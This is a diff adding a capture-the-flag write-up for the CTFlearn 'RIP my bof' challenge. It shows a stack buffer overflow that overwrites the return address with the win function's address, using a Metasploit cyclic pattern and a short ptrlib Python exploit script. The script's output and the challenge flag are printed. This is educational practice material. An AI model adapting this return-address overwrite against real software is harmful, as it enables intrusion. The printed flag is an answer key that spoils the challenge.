@@ -1,0 +1,106 @@
+References:
+https://www.metasploit.com/
+https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html
+/opt/metasploit-framework/bin/msfconsole
+
+
+daniel@daniel3131:~$ nc thekidofarcrania.com 4902
+
+Legend: buff MODIFIED padding MODIFIED
+  notsecret MODIFIED secret MODIFIED
+  return address MODIFIED
+0xffd75ce0 | 00 00 00 00 00 00 00 00 |
+0xffd75ce8 | 00 00 00 00 00 00 00 00 |
+0xffd75cf0 | 00 00 00 00 00 00 00 00 |
+0xffd75cf8 | 00 00 00 00 00 00 00 00 |
+0xffd75d00 | ff ff ff ff ff ff ff ff |
+0xffd75d08 | ff ff ff ff ff ff ff ff |
+0xffd75d10 | c0 45 f2 f7 00 a0 04 08 |
+0xffd75d18 | 28 5d d7 ff 8b 86 04 08 |
+Return address: 0x0804868b (we want to send payload to this address to get the flag)
+
+
+Buffer overflow (all 64 bytes):
+
+Input some text: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Legend: buff MODIFIED padding MODIFIED
+  notsecret MODIFIED secret MODIFIED
+  return address MODIFIED
+0xffd75ce0 | 41 41 41 41 41 41 41 41 |
+0xffd75ce8 | 41 41 41 41 41 41 41 41 |
+0xffd75cf0 | 41 41 41 41 41 41 41 41 |
+0xffd75cf8 | 41 41 41 41 41 41 41 41 |
+0xffd75d00 | 41 41 41 41 41 41 41 41 |
+0xffd75d08 | 41 41 41 41 41 41 41 41 |
+0xffd75d10 | 41 41 41 41 41 41 41 41 |
+0xffd75d18 | 41 41 41 41 41 41 41 41 |
+Return address: 0x41414141
+
+
+
+We need to create a payload in order to get the flag.
+
+run:
+/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 60
+
+
+you will get: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9
+
+to create patterns until 60 bytes.
+
+
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ objdump -D server | grep win
+08048586 <win>:
+                
+https://www.save-editor.com/tools/wse_hex.html
+
+convert it to little-endian encoding: 86850408 = \x86\x85\x04\x08
+
+'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9' + '\x86\x85\x04\x08'
+
+
+
+create python script to run the payload
+
+```
+from ptrlib import *
+
+sock = Socket("thekidofarcrania.com", 4902)
+
+payload = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9' + '\x86\x85\x04\x08'
+
+sock.sendlineafter("Input some text:", payload)
+
+while True:
+	print(sock.recvline().decode("utf-8"))
+```
+
+
+
+
+C:\Python\python.exe "D:\Project_2024\CTFLearn\solutions\binary\RIP my bof\run.py" 
+[+] __init__: Successfully connected to thekidofarcrania.com:4902
+
+Legend: buff MODIFIED padding MODIFIED
+  notsecret MODIFIED secret MODIFIED
+  return address MODIFIED
+0xffe83b00 | 41 61 30 41 61 31 41 61 |
+0xffe83b08 | 32 41 61 33 41 61 34 41 |
+0xffe83b10 | 61 35 41 61 36 41 61 37 |
+0xffe83b18 | 41 61 38 41 61 39 41 62 |
+0xffe83b20 | 30 41 62 31 41 62 32 41 |
+0xffe83b28 | 62 33 41 62 34 41 62 35 |
+0xffe83b30 | 41 62 36 41 62 37 41 62 |
+0xffe83b38 | 38 41 62 39 86 85 04 08 |
+Return address: 0x08048586
+
+CTFlearn{c0ntr0ling_r1p_1s_n0t_t00_h4rd_abjkdlfa}
+timeout: the monitored command dumped core
+
+
+
+flag: CTFlearn{c0ntr0ling_r1p_1s_n0t_t00_h4rd_abjkdlfa}
+
